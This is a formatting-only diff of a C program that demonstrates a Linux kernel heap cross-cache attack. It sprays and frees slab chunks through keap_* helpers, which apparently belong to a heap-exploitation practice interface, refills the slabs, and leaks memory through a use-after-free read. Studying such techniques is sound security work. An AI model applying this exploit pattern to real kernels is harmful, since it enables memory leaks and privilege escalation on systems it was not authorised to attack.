@@ -3,14 +3,14 @@
 #include <string.h>
 #include <strings.h>
 
-
 /*******************************
  * EXPLOIT                     *
  *******************************/
 
 #define CC_OVERFLOW_FACTOR 5
 
-#define VICTIM_CHUNKS(cur) (cur->objs_per_slab*(cur->cpu_partial+1)*CC_OVERFLOW_FACTOR)
+#define VICTIM_CHUNKS(cur)                                                     \
+  (cur->objs_per_slab * (cur->cpu_partial + 1) * CC_OVERFLOW_FACTOR)
 
 #define TARGET_SIZE 0x100
 #define TARGET_CHUNKS 0x800
@@ -38,32 +38,32 @@ int main(int argc, char *argv[]) {
 
   linfo("fill old victim slabs");
   // fill at least on slab
-  for(int i = 0; i < VICTIM_CHUNKS(cur); ++i) {
+  for (int i = 0; i < VICTIM_CHUNKS(cur); ++i) {
     victim_chunks[i] = keap_malloc(cur->size, GFP_KERNEL_ACCOUNT);
     // clear victim chunks
     keap_write(victim_chunks[i], leak, cur->size);
-    if (i == (VICTIM_CHUNKS(cur) / 8)*7)
+    if (i == (VICTIM_CHUNKS(cur) / 8) * 7)
       victim_ptr = victim_chunks[i];
   }
 
   // free slab in order to get cross cache
   linfo("free victim slabs");
-  for(int i = 0; i < VICTIM_CHUNKS(cur); ++i) {
+  for (int i = 0; i < VICTIM_CHUNKS(cur); ++i) {
     keap_free(victim_chunks[i]);
   }
 
   linfo("fill target slabs");
-  for(int i = 0; i < TARGET_CHUNKS; ++i) {
+  for (int i = 0; i < TARGET_CHUNKS; ++i) {
     target_chunks[i] = keap_malloc(TARGET_SIZE, GFP_KERNEL);
     keap_write(target_chunks[i], buf, TARGET_SIZE);
   }
 
   linfo("uaf and cross-cache leak");
   // UAF in victim ptr leak
-  keap_read(victim_ptr, leak, cur->size-1);
+  keap_read(victim_ptr, leak, cur->size - 1);
   linfo("leak: %.8s", leak);
 
-  for(int i = 0; i < TARGET_CHUNKS; ++i) {
+  for (int i = 0; i < TARGET_CHUNKS; ++i) {
     keap_free(target_chunks[i]);
   }
 
